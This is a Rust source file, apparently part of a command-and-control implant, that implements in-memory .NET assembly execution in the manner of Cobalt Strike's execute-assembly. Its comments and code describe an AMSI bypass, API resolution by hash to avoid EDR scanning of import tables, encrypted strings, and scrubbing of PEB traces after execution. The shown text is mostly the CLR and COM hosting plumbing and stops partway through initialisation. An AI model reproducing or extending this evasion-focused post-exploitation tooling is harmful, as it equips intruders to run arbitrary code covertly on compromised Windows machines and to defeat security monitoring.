//! In-process .NET assembly execution via CLR hosting (ICLRMetaHost).
//!
//! This module provides the equivalent of Cobalt Strike's `execute-assembly`:
//! it loads and runs an arbitrary .NET assembly entirely in the current process
//! without spawning any child process or touching disk.
//!
//! # Architecture
//!
//! 1. **Lazy CLR init** — The CLR is loaded on the first call to [`execute`]
//!    and kept alive for reuse.  After 5 minutes of idle time, a background
//!    watcher tears down the host and unloads CLR DLLs.
//! 2. **AMSI bypass** — Before loading the assembly, the module ensures the
//!    AMSI bypass is active (calls `amsi_defense::orchestrate_layers()`).
//! 3. **Isolation** — Each execution happens in a fresh `AppDomain` so that
//!    static state and loaded assemblies from one invocation don't leak into
//!    the next.
//! 4. **Output capture** — `stdout`/`stderr` are redirected to anonymous pipes
//!    and read back after the assembly finishes.
//! 5. **Timeout** — A wall-clock timeout terminates the CLR thread if the
//!    assembly doesn't return in time.
//! 6. **Hygiene** — After execution, PEB traces are scrubbed and handles
//!    cleaned up via `memory_hygiene`.
//!
//! # CLR Hosting Flow
//!
//! ```text
//! CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost)
//!   → ICLRMetaHost::EnumerateInstalledRuntimes()
//!     → pick latest v4.x runtime
//!       → ICLRRuntimeInfo::GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost)
//!         → ICLRRuntimeHost::Start()
//!
//! In-memory path (preferred):
//!   ICLRRuntimeInfo::GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost)
//!     → ICorRuntimeHost::GetDefaultDomain()
//!       → IDispatch::AppDomain.Load_3(SAFEARRAY<byte>)
//!         → IDispatch::Assembly.EntryPoint
//!           → IDispatch::MethodInfo.Invoke_2(null, args)
//!
//! File-based fallback (when in-memory unavailable):
//!   → ICLRRuntimeHost::ExecuteInDefaultAppDomain(assembly, type, method, args)
//! ```
//!
//! # OPSEC
//!
//! - CLR DLLs are loaded lazily (not at agent startup).
//! - After 5 min idle, the host is stopped and CLR DLLs are unlinked from the
//!   PEB via `memory_hygiene::scrub_peb_traces()`.
//! - The module is entirely `cfg(windows)`.

#![cfg(windows)]

use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

use once_cell::sync::Lazy;
use winapi::shared::guiddef::{CLSID, IID, REFIID};
use winapi::shared::minwindef::{DWORD, HMODULE, LPDWORD, LPVOID, ULONG};
use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR, OBJECT_ATTRIBUTES, UNICODE_STRING};
use winapi::shared::winerror::S_OK;
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::winbase::WAIT_OBJECT_0;
use winapi::um::winnt::HANDLE;

// ── Constants ────────────────────────────────────────────────────────────────

/// Maximum assembly size (10 MB).
const MAX_ASSEMBLY_SIZE: usize = 10 * 1024 * 1024;
/// Maximum number of arguments.
const MAX_ARGS: usize = 32;
/// Default execution timeout (seconds).
const DEFAULT_TIMEOUT_SECS: u64 = 30;
/// Idle timeout before auto-teardown (seconds).
const IDLE_TIMEOUT_SECS: u64 = 300;
/// CLSID for ICLRMetaHost.
const CLSID_CLR_META_HOST: GUID = GUID {
    data1: 0x9280188D,
    data2: 0x0E8E,
    data3: 0x4867,
    data4: [0xB3, 0x0C, 0x7F, 0xA8, 0x63, 0x84, 0xB6, 0x76],
};
/// IID for ICLRMetaHost.
const IID_ICLR_META_HOST: GUID = GUID {
    data1: 0xD332DB9E,
    data2: 0xB9B2,
    data3: 0x4127,
    data4: [0xB4, 0x2E, 0x83, 0xE7, 0x09, 0x49, 0x21, 0xED],
};
/// CLSID for ICLRRuntimeHost.
const CLSID_CLR_RUNTIME_HOST: GUID = GUID {
    data1: 0x90F1A06E,
    data2: 0x7712,
    data3: 0x4762,
    data4: [0x86, 0x85, 0x82, 0x1F, 0xA2, 0x9E, 0x53, 0xAC],
};
/// IID for ICLRRuntimeHost.
const IID_ICLR_RUNTIME_HOST: GUID = GUID {
    data1: 0x90F1A06C,
    data2: 0x7712,
    data3: 0x4762,
    data4: [0x86, 0x85, 0x82, 0x1F, 0xA2, 0x9E, 0x53, 0xAC],
};

/// Name of the mscoree.dll export that creates CLR instances.
const CLR_CREATE_INSTANCE: &[u8] = b"CLRCreateInstance\0";

// ── Dynamic API resolution — no IAT entries ──────────────────────────────────
//
// All Win32 API functions are resolved at runtime via PEB walking and PE
// export-table hashing (pe_resolve).  This avoids creating IAT entries that
// EDR products scan for.

type FnCreatePipe = unsafe extern "system" fn(
    *mut HANDLE, *mut HANDLE, *mut SECURITY_ATTRIBUTES, DWORD,
) -> i32;
type FnPeekNamedPipe = unsafe extern "system" fn(
    HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD,
) -> i32;
type FnReadFile = unsafe extern "system" fn(
    HANDLE, LPVOID, DWORD, LPDWORD, *mut c_void,
) -> i32;
type FnLoadLibraryW = unsafe extern "system" fn(LPCWSTR) -> HMODULE;
type FnCoInitializeEx = unsafe extern "system" fn(LPVOID, DWORD) -> HRESULT;
type FnCreateEventW = unsafe extern "system" fn(
    *mut SECURITY_ATTRIBUTES, DWORD, DWORD, LPCWSTR,
) -> HANDLE;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

/// Resolve a function pointer by DLL hash and function-name hash.
///
/// # Safety
///
/// Caller must ensure the transmuted type `T` matches the actual function
/// signature.
#[inline(always)]
unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
    let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
    Some(std::mem::transmute::<_, T>(fn_addr))
}

// ── COM GUID helper ──────────────────────────────────────────────────────────

#[repr(C)]
#[derive(Copy, Clone)]
struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

impl GUID {
    fn as_ptr(&self) -> REFIID {
        self as *const _ as REFIID
    }

    fn as_clsid_ptr(&self) -> *const CLSID {
        self as *const _ as *const CLSID
    }
}

unsafe impl Send for GUID {}
unsafe impl Sync for GUID {}

// ── CLR COM Interface Definitions ────────────────────────────────────────────

/// IEnumUnknown — used to enumerate runtimes.
#[repr(C)]
struct IEnumUnknownVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    next: unsafe extern "system" fn(*mut c_void, ULONG, *mut LPVOID, *mut ULONG) -> HRESULT,
    skip: unsafe extern "system" fn(*mut c_void, ULONG) -> HRESULT,
    reset: unsafe extern "system" fn(*mut c_void) -> HRESULT,
    clone: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT,
}

#[repr(C)]
struct IEnumUnknown {
    vtable: *const IEnumUnknownVtable,
}

/// ICLRRuntimeInfo — provides information about an installed CLR version.
#[repr(C)]
struct ICLRRuntimeInfoVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    get_version_string:
        unsafe extern "system" fn(*mut c_void, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
    get_runtime_directory:
        unsafe extern "system" fn(*mut c_void, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
    is_loaded: unsafe extern "system" fn(*mut c_void, DWORD, *mut i32) -> HRESULT,
    load_error_string:
        unsafe extern "system" fn(*mut c_void, HRESULT, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
    load_library:
        unsafe extern "system" fn(*mut c_void, LPCWSTR, *mut LPVOID) -> HRESULT,
    get_proc_address:
        unsafe extern "system" fn(*mut c_void, LPCWSTR, LPCWSTR, *mut LPVOID) -> HRESULT,
    bind_as_legacy:
        unsafe extern "system" fn(*mut c_void) -> HRESULT,
    is_started: unsafe extern "system" fn(*mut c_void, *mut i32, *mut i32) -> HRESULT,
    get_interface:
        unsafe extern "system" fn(*mut c_void, *const CLSID, REFIID, *mut LPVOID) -> HRESULT,
}

#[repr(C)]
struct ICLRRuntimeInfo {
    vtable: *const ICLRRuntimeInfoVtable,
}

/// ICLRMetaHost — the top-level CLR hosting interface.
#[repr(C)]
struct ICLRMetaHostVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    get_runtime: unsafe extern "system" fn(*mut c_void, LPCWSTR, REFIID, *mut LPVOID) -> HRESULT,
    get_version_from_process:
        unsafe extern "system" fn(*mut c_void, HANDLE, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
    enumerate_installed_runtimes:
        unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    enumerate_loaded_runtimes:
        unsafe extern "system" fn(*mut c_void, HANDLE, REFIID, *mut LPVOID) -> HRESULT,
    request_runtime_loaded_notification:
        unsafe extern "system" fn(*mut c_void, *mut c_void) -> HRESULT,
    query_legacy_v2_runtime_binding:
        unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID, *mut c_void) -> HRESULT,
    exit_process: unsafe extern "system" fn(*mut c_void, DWORD) -> HRESULT,
}

#[repr(C)]
struct ICLRMetaHost {
    vtable: *const ICLRMetaHostVtable,
}

/// ICLRRuntimeHost — the runtime host interface for executing managed code.
#[repr(C)]
struct ICLRRuntimeHostVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    start: unsafe extern "system" fn(*mut c_void) -> HRESULT,
    stop: unsafe extern "system" fn(*mut c_void) -> HRESULT,
    set_host_control: unsafe extern "system" fn(*mut c_void, *mut c_void) -> HRESULT,
    get_clr_control: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT,
    unload_app_domain:
        unsafe extern "system" fn(*mut c_void, DWORD, i32) -> HRESULT,
    execute_in_default_app_domain: unsafe extern "system" fn(
        *mut c_void,
        LPCWSTR,
        LPCWSTR,
        LPCWSTR,
        LPCWSTR,
        *mut DWORD,
    ) -> HRESULT,
    execute_application:
        unsafe extern "system" fn(*mut c_void, LPCWSTR, DWORD, *mut LPWSTR, *mut i32) -> HRESULT,
}

#[repr(C)]
struct ICLRRuntimeHost {
    vtable: *const ICLRRuntimeHostVtable,
}

// ── ICorRuntimeHost (.NET 2.0 compatible hosting) ───────────────────────────
//
// Unlike ICLRRuntimeHost (v4), ICorRuntimeHost exposes GetDefaultDomain()
// which returns the default AppDomain as an IUnknown pointer.  We QI for
// IDispatch and use late binding to call AppDomain.Load_3(byte[]), which
// loads an assembly from memory without touching disk.
//
// The v4 runtime supports the v2 hosting interface for backward compat, so
// we can obtain this via ICLRRuntimeInfo::GetInterface alongside
// ICLRRuntimeHost.

const CLSID_COR_RUNTIME_HOST: GUID = GUID {
    data1: 0xCB2F6722,
    data2: 0xAB3A,
    data3: 0x11D2,
    data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
};

const IID_ICOR_RUNTIME_HOST: GUID = GUID {
    data1: 0xCB2F6723,
    data2: 0xAB3A,
    data3: 0x11D2,
    data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
};

#[repr(C)]
struct ICorRuntimeHostVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    create_domain: unsafe extern "system" fn(
        *mut c_void,      // this
        LPCWSTR,          // pwzFriendlyName
        *mut c_void,      // pIdentityArray (IUnknown*)
        *mut *mut c_void, // ppAppDomain (IUnknown**)
    ) -> HRESULT,
    get_default_domain: unsafe extern "system" fn(
        *mut c_void,      // this
        *mut *mut c_void, // ppAppDomain (IUnknown**)
    ) -> HRESULT,
}

#[repr(C)]
struct ICorRuntimeHost {
    vtable: *const ICorRuntimeHostVtable,
}

// ── IDispatch (COM late binding) ─────────────────────────────────────────────
//
// Used to call managed methods (AppDomain.Load_3, Assembly.EntryPoint,
// MethodInfo.Invoke_2) without needing the exact vtable layout of managed
// COM interfaces (~60 methods for _AppDomain).  The CLR's COM Callable
// Wrapper (CCW) natively supports IDispatch.

const IID_IDISPATCH: GUID = GUID {
    data1: 0x00020400,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

#[repr(C)]
struct IDispatchVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    get_type_info_count: unsafe extern "system" fn(*mut c_void, *mut u32) -> HRESULT,
    get_type_info:
        unsafe extern "system" fn(*mut c_void, u32, u32, *mut *mut c_void) -> HRESULT,
    get_ids_of_names: unsafe extern "system" fn(
        *mut c_void,    // this
        REFIID,         // riid
        *const LPCWSTR, // rgszNames
        u32,            // cNames
        u32,            // lcid
        *mut i32,       // rgDispId
    ) -> HRESULT,
    invoke: unsafe extern "system" fn(
        *mut c_void,    // this
        i32,            // dispIdMember
        REFIID,         // riid
        u32,            // lcid
        u16,            // wFlags
        *mut DISPPARAMS,// pDispParams
        *mut VARIANT,   // pVarResult
        *mut EXCEPINFO, // pExcepInfo
        *mut u32,       // puArgErr
    ) -> HRESULT,
}

#[repr(C)]
struct IDispatch {
    vtable: *const IDispatchVtable,
}

// ── VARIANT / DISPPARAMS / EXCEPINFO ─────────────────────────────────────────

const VT_EMPTY: u16 = 0x0000;
const VT_NULL: u16 = 0x0001;
const VT_I4: u16 = 0x0003;
const VT_BSTR: u16 = 0x0008;
const VT_DISPATCH: u16 = 0x0009;
const VT_UNKNOWN: u16 = 0x000D;
const VT_UI1: u16 = 0x0011;
const VT_VARIANT: u16 = 0x000C;
const VT_ARRAY: u16 = 0x2000;
const VT_BYREF: u16 = 0x4000;

const DISPATCH_METHOD: u16 = 0x0001;
const DISPATCH_PROPERTYGET: u16 = 0x0002;
const DISPID_PROPERTYPUT: i32 = -3;
const LOCALE_USER_DEFAULT: u32 = 0x0400;

/// Null GUID for IDispatch calls (riid parameter is reserved and must be
/// IID_NULL per MSDN).
const IID_NULL: GUID = GUID {
    data1: 0x00000000,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
};

/// OLE Automation VARIANT union — 16 bytes on x64 (largest member is the
/// record struct with two pointers: pvRecord + pRecInfo).
#[repr(C)]
#[derive(Copy, Clone)]
union VARIANTData {
    ll_val: i64,
    l_val: i32,
    ul_val: u32,
    i_val: i16,
    bool_val: i16,
    scode: i32,
    flt_val: f32,
    dbl_val: f64,
    bstr_val: *mut u16,
    punk_val: *mut c_void,
    pdisp_val: *mut c_void,
    parray: *mut c_void,
    byref: *mut c_void,
    _record: [u64; 2],
}

impl Copy for VARIANTData {}
impl Clone for VARIANTData {
    fn clone(&self) -> Self {
        *self
    }
}

/// OLE Automation VARIANT — 24 bytes on x64 (8-byte header + 16-byte union).
#[repr(C)]
struct VARIANT {
    vt: u16,
    w_reserved1: u16,
    w_reserved2: u16,
    w_reserved3: u16,
    data: VARIANTData,
}

impl VARIANT {
    fn empty() -> Self {
        VARIANT {
            vt: VT_EMPTY,
            w_reserved1: 0,
            w_reserved2: 0,
            w_reserved3: 0,
            data: VARIANTData { ll_val: 0 },
        }
    }

    fn null() -> Self {
        VARIANT {
            vt: VT_NULL,
            w_reserved1: 0,
            w_reserved2: 0,
            w_reserved3: 0,
            data: VARIANTData { ll_val: 0 },
        }
    }

    fn from_i4(val: i32) -> Self {
        VARIANT {
            vt: VT_I4,
            w_reserved1: 0,
            w_reserved2: 0,
            w_reserved3: 0,
            data: VARIANTData { l_val: val },
        }
    }

    fn from_dispatch(disp: *mut IDispatch) -> Self {
        VARIANT {
            vt: VT_DISPATCH,
            w_reserved1: 0,
            w_reserved2: 0,
            w_reserved3: 0,
            data: VARIANTData {
                pdisp_val: disp as *mut c_void,
            },
        }
    }

    fn from_safe_array(sa: *mut c_void) -> Self {
        VARIANT {
            vt: VT_ARRAY | VT_UI1,
            w_reserved1: 0,
            w_reserved2: 0,
            w_reserved3: 0,
            data: VARIANTData { parray: sa },
        }
    }

    fn from_safe_array_bstr(sa: *mut c_void) -> Self {
        VARIANT {
            vt: VT_ARRAY | VT_BSTR,
            w_reserved1: 0,
            w_reserved2: 0,
            w_reserved3: 0,
            data: VARIANTData { parray: sa },
        }
    }

    fn from_safe_array_variant(sa: *mut c_void) -> Self {
        VARIANT {
            vt: VT_ARRAY | VT_VARIANT,
            w_reserved1: 0,
            w_reserved2: 0,
            w_reserved3: 0,
            data: VARIANTData { parray: sa },
        }
    }
}

unsafe impl Send for VARIANT {}
unsafe impl Sync for VARIANT {}

#[repr(C)]
struct DISPPARAMS {
    rgvarg: *mut VARIANT,
    rgdispid_named_args: *mut i32,
    c_args: u32,
    c_named_args: u32,
}

#[repr(C)]
struct EXCEPINFO {
    w_code: u16,
    w_reserved: u16,
    bstr_source: *mut u16,
    bstr_description: *mut u16,
    bstr_help_file: *mut u16,
    dw_help_context: u32,
    pv_reserved: *mut c_void,
    pfn_deferred_fill_in: Option<unsafe extern "system" fn(*mut EXCEPINFO) -> HRESULT>,
    scode: i32,
}

// ── OLEAUT32 function pointer types ──────────────────────────────────────────

type FnSafeArrayCreateVector = unsafe extern "system" fn(
    u16,         // vt (element type)
    i32,         // lLbound (lower bound)
    u32,         // cElements (count)
) -> *mut c_void; // SAFEARRAY*

type FnSafeArrayAccessData =
    unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT;

type FnSafeArrayUnaccessData = unsafe extern "system" fn(*mut c_void) -> HRESULT;

type FnSafeArrayDestroy = unsafe extern "system" fn(*mut c_void) -> HRESULT;

type FnSysAllocString = unsafe extern "system" fn(*const u16) -> *mut u16; // BSTR

type FnSysFreeString = unsafe extern "system" fn(*mut u16);

type FnVariantClear = unsafe extern "system" fn(*mut VARIANT) -> HRESULT;

// ── CLRCreateInstance function signature ─────────────────────────────────────

type FnCLRCreateInstance =
    unsafe extern "system" fn(*const CLSID, REFIID, *mut LPVOID) -> HRESULT;

// ── Global CLR Host State ────────────────────────────────────────────────────

/// Global CLR host state, lazily initialized on first `execute()` call.
struct ClrHostState {
    /// Pointer to the loaded mscoree.dll module.
    mscoree: HMODULE,
    /// Pointer to the ICLRRuntimeHost COM interface.
    runtime_host: *mut ICLRRuntimeHost,
    /// Pointer to the ICorRuntimeHost COM interface (for in-memory loading).
    /// May be null if the v2 hosting interface is unavailable.
    cor_host: *mut ICorRuntimeHost,
    /// Function pointer for CLRCreateInstance.
    create_instance_fn: Option<FnCLRCreateInstance>,
    /// Timestamp (via `Instant::now()`) of the last execution.
    last_used: Instant,
    /// Whether the host has been initialized.
    initialized: bool,
    /// Set to `true` after a CLR exec thread is forcefully terminated via
    /// `NtTerminateThread`.  The next `execute()` call will tear down the
    /// CLR host and re-create it from scratch to avoid running on a
    /// potentially corrupted CLR runtime.
    needs_reinit: bool,
}

unsafe impl Send for ClrHostState {}
unsafe impl Sync for ClrHostState {}

static CLR_HOST: Lazy<Mutex<Option<ClrHostState>>> = Lazy::new(|| Mutex::new(None));

/// Track whether COM has been initialized on this thread.
static COM_INITIALIZED: AtomicBool = AtomicBool::new(false);

// ── Helper: wide string from Rust string ─────────────────────────────────────

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// ── Helper: read pipe non-blocking ──────────────────────────────────────────

unsafe fn read_pipe_to_vec(handle: HANDLE, buf: &mut Vec<u8>) -> bool {
    let peek_named_pipe: FnPeekNamedPipe = match resolve_api(
        pe_resolve::HASH_KERNEL32_DLL,
        pe_resolve::hash_str(b"PeekNamedPipe\0"),
    ) {
        Some(f) => f,
        None => return false,
    };
    let read_file: FnReadFile = match resolve_api(
        pe_resolve::HASH_KERNEL32_DLL,
        pe_resolve::hash_str(b"ReadFile\0"),
    ) {
        Some(f) => f,
        None => return false,
    };

    let mut bytes_avail: DWORD = 0;
    let peek_ok = peek_named_pipe(
        handle,
        std::ptr::null_mut(),
        0,
        std::ptr::null_mut(),
        &mut bytes_avail,
        std::ptr::null_mut(),
    );
    if peek_ok == 0 {
        // Pipe may be closed or error.
        return false;
    }
    if bytes_avail == 0 {
        return true; // No data but pipe still open.
    }
    let mut tmp = vec![0u8; bytes_avail as usize];
    let mut bytes_read: DWORD = 0;
    let ok = read_file(
        handle,
        tmp.as_mut_ptr() as *mut _,
        bytes_avail,
        &mut bytes_read,
        std::ptr::null_mut(),
    );
    if ok == 0 || bytes_read == 0 {
        return false;
    }
    buf.extend_from_slice(&tmp[..bytes_read as usize]);
    true
}

// ── OLEAUT32 helpers for SAFEARRAY / IDispatch ───────────────────────────────

/// Resolve an oleaut32.dll function by name hash (no IAT entry).
unsafe fn resolve_oleaut32_fn<T>(name: &[u8]) -> Option<T> {
    let load_library_w: FnLoadLibraryW = resolve_api(
        pe_resolve::HASH_KERNEL32_DLL,
        pe_resolve::hash_str(b"LoadLibraryW\0"),
    )?;
    let oleaut32_name = string_crypt::enc_wstr!("oleaut32.dll");
    let oleaut32 = load_library_w(oleaut32_name.as_ptr());
    if oleaut32.is_null() {
        return None;
    }
    let proc = pe_resolve::get_proc_address_by_hash(
        oleaut32 as usize,
        pe_resolve::hash_str(name),
    )?;
    Some(std::mem::transmute_copy(&proc))
}

/// Create a SAFEARRAY of VT_UI1 (byte array) from raw bytes.
/// Returns a SAFEARRAY pointer that must be destroyed with SafeArrayDestroy.
unsafe fn safe_array_from_bytes(data: &[u8]) -> Result<*mut c_void, String> {
    let create_vector: FnSafeArrayCreateVector = resolve_oleaut32_fn(b"SafeArrayCreateVector\0")
        .ok_or("cannot resolve SafeArrayCreateVector from oleaut32")?;
    let access_data: FnSafeArrayAccessData = resolve_oleaut32_fn(b"SafeArrayAccessData\0")
        .ok_or("cannot resolve SafeArrayAccessData from oleaut32")?;
    let unaccess_data: FnSafeArrayUnaccessData = resolve_oleaut32_fn(b"SafeArrayUnaccessData\0")
        .ok_or("cannot resolve SafeArrayUnaccessData from oleaut32")?;

    let sa = create_vector(VT_UI1, 0, data.len() as u32);
    if sa.is_null() {
        return Err("SafeArrayCreateVector returned null".to_string());
    }
    let mut pv: *mut c_void = std::ptr::null_mut();
    let hr = access_data(sa, &mut pv);
    if hr != S_OK || pv.is_null() {
        let destroy: FnSafeArrayDestroy = resolve_oleaut32_fn(b"SafeArrayDestroy\0")
            .unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
        if !destroy as bool {
            destroy(sa);
        }
        return Err(format!("SafeArrayAccessData failed: hr={:#010X}", hr as u32));
    }
    std::ptr::copy_nonoverlapping(data.as_ptr(), pv as *mut u8, data.len());
    unaccess_data(sa);
    Ok(sa)
}

/// Create a SAFEARRAY of VT_VARIANT from a slice of VARIANTs.
unsafe fn safe_array_from_variants(variants: &[VARIANT]) -> Result<*mut c_void, String> {
    let create_vector: FnSafeArrayCreateVector = resolve_oleaut32_fn(b"SafeArrayCreateVector\0")
        .ok_or("cannot resolve SafeArrayCreateVector from oleaut32")?;
    let access_data: FnSafeArrayAccessData = resolve_oleaut32_fn(b"SafeArrayAccessData\0")
        .ok_or("cannot resolve SafeArrayAccessData from oleaut32")?;
    let unaccess_data: FnSafeArrayUnaccessData = resolve_oleaut32_fn(b"SafeArrayUnaccessData\0")
        .ok_or("cannot resolve SafeArrayUnaccessData from oleaut32")?;

    let sa = create_vector(VT_VARIANT, 0, variants.len() as u32);
    if sa.is_null() {
        return Err("SafeArrayCreateVector(VT_VARIANT) returned null".to_string());
    }
    let mut pv: *mut c_void = std::ptr::null_mut();
    let hr = access_data(sa, &mut pv);
    if hr != S_OK || pv.is_null() {
        let destroy: FnSafeArrayDestroy = resolve_oleaut32_fn(b"SafeArrayDestroy\0")
            .unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
        if !destroy as bool {
            destroy(sa);
        }
        return Err(format!("SafeArrayAccessData failed: hr={:#010X}", hr as u32));
    }
    std::ptr::copy_nonoverlapping(
        variants.as_ptr() as *const u8,
        pv as *mut u8,
        variants.len() * std::mem::size_of::<VARIANT>(),
    );
    unaccess_data(sa);
    Ok(sa)
}

/// Destroy a SAFEARRAY.
unsafe fn safe_array_destroy(sa: *mut c_void) {
    if sa.is_null() { return; }
    if let Some(destroy) = resolve_oleaut32_fn::<FnSafeArrayDestroy>(b"SafeArrayDestroy\0") {
        destroy(sa);
    }
}

/// Call IDispatch::GetIDsOfNames for a single method name.
/// Returns the DISPID for the named method/property.
unsafe fn dispatch_get_id(
    dispatch: *mut IDispatch,
    name: &[u16], // wide, null-terminated
) -> Result<i32, String> {
    let disp = &*dispatch;
    let name_ptr: LPCWSTR = name.as_ptr();
    let mut dispid: i32 = 0;
    let hr = (disp.vtable.get_ids_of_names)(
        dispatch as *mut c_void,
        IID_NULL.as_ptr(),
        &name_ptr,
        1,
        LOCALE_USER_DEFAULT,
        &mut dispid,
    );
    if hr != S_OK {
        return Err(format!(
            "GetIDsOfNames failed for '{}': hr={:#010X}",
            String::from_utf16_lossy(&name[..name.len().saturating_sub(1)]),
            hr as u32
        ));
    }
    Ok(dispid)
}

/// Call IDispatch::Invoke with the given parameters.
/// Returns the result VARIANT (caller must VariantClear it).
unsafe fn dispatch_invoke(
    dispatch: *mut IDispatch,
    dispid: i32,
    w_flags: u16,
    params: &mut DISPPARAMS,
) -> Result<VARIANT, String> {
    let disp = &*dispatch;
    let mut result = VARIANT::empty();
    let mut excep_info = std::mem::zeroed::<EXCEPINFO>();
    let mut arg_err: u32 = 0;

    let hr = (disp.vtable.invoke)(
        dispatch as *mut c_void,
        dispid,
        IID_NULL.as_ptr(),
        LOCALE_USER_DEFAULT,
        w_flags,
        params,
        &mut result,
        &mut excep_info,
        &mut arg_err,
    );
    if hr != S_OK {
        // Try to extract error description from EXCEPINFO.
        let desc = if !excep_info.bstr_description.is_null() {
            // BSTR is a length-prefixed wide string.  Read up to the first
            // null or 256 chars for safety.
            let mut chars = Vec::new();
            let mut p = excep_info.bstr_description;
            for _ in 0..256 {
                if *p == 0 { break; }
                chars.push(*p);
                p = p.add(1);
            }
            // Free the BSTR
            if let Some(sys_free) = resolve_oleaut32_fn::<FnSysFreeString>(b"SysFreeString\0") {
                sys_free(excep_info.bstr_description);
            }
            String::from_utf16_lossy(&chars)
        } else {
            format!("hr={:#010X}", hr as u32)
        };
        return Err(format!("IDispatch::Invoke(DISPID={}) failed: {}", dispid, desc));
    }
    Ok(result)
}

/// Clear a VARIANT (releases any held reference).
unsafe fn variant_clear(var: &mut VARIANT) {
    if let Some(clear) = resolve_oleaut32_fn::<FnVariantClear>(b"VariantClear\0") {
        clear(var);
    }
}

/// Allocate a BSTR from a null-terminated wide string.
unsafe fn sys_alloc_string(s: &[u16]) -> *mut u16 {
    match resolve_oleaut32_fn::<FnSysAllocString>(b"SysAllocString\0") {
        Some(alloc) => alloc(s.as_ptr()),
        None => std::ptr::null_mut(),
    }
}

/// Free a BSTR.
unsafe fn sys_free_string(s: *mut u16) {
    if s.is_null() { return; }
    if let Some(free) = resolve_oleaut32_fn::<FnSysFreeString>(b"SysFreeString\0") {
        free(s);
    }
}

// ── CLR Host Initialization ──────────────────────────────────────────────────

/// Initialize the CLR host.  Loads mscoree.dll, creates ICLRMetaHost,
/// enumerates installed runtimes, picks the latest v4.x, and obtains
/// ICLRRuntimeHost.
unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost), String> {
    // ── Load mscoree.dll (dynamically resolved LoadLibraryW) ────────────
    let load_library_w: FnLoadLibraryW = resolve_api(
        pe_resolve::HASH_KERNEL32_DLL,
        pe_resolve::hash_str(b"LoadLibraryW\0"),
    ).ok_or("cannot resolve LoadLibraryW from kernel32")?;

    let mscoree_name = string_crypt::enc_wstr!("mscoree.dll");
    let mscoree = load_library_w(mscoree_name.as_ptr());
    if mscoree.is_null() {
        return Err("failed to load mscoree.dll — .NET Framework may not be installed".to_string());
    }
    log::info!("[assembly_loader] mscoree.dll loaded at {:?}", mscoree);

    // ── Get CLRCreateInstance export (dynamic PE export resolution) ──────
    let proc = pe_resolve::get_proc_address_by_hash(
        mscoree as usize,
        pe_resolve::hash_str(CLR_CREATE_INSTANCE),
    ).ok_or("CLRCreateInstance not found in mscoree.dll")?;
    let create_instance: FnCLRCreateInstance = std::mem::transmute(proc);

    // ── Create ICLRMetaHost ──────────────────────────────────────────────
    let mut meta_host_ptr: LPVOID = std::ptr::null_mut();
    let hr = create_instance(
        CLSID_CLR_META_HOST.as_clsid_ptr(),
        IID_ICLR_META_HOST.as_ptr(),
        &mut meta_host_ptr,
    );
    if hr != S_OK || meta_host_ptr.is_null() {
        return Err(format!(
            "CLRCreateInstance(CLSID_CLRMetaHost) failed: hr={:#010X}",
            hr as u32
        ));
    }
    let meta_host = &*(meta_host_ptr as *const ICLRMetaHost);
    log::info!("[assembly_loader] ICLRMetaHost obtained");

    // ── Enumerate installed runtimes → pick latest v4.x ─────────────────
